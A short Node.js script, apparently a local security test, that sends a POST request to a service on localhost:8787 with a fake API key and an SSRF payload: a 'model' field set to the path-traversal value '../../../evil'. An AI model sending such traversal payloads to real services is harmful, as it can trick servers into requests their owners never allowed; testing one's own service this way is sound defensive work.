const http = require('http');

async function testSSRF() {
  const req = http.request({
    hostname: 'localhost',
    port: 8787,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-User-Api-Key': 'fake-key'
    }
  }, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      console.log('Status:', res.statusCode);
      console.log('Response:', data);
    });
  });

  req.on('error', (e) => {
    console.error(`Problem with request: ${e.message}`);
  });

  // the SSRF payload payload:
  const payload = JSON.stringify({
    text: "hola",
    model: "../../../evil",
    stream: false
  });

  req.write(payload);
  req.end();
}

testSSRF();
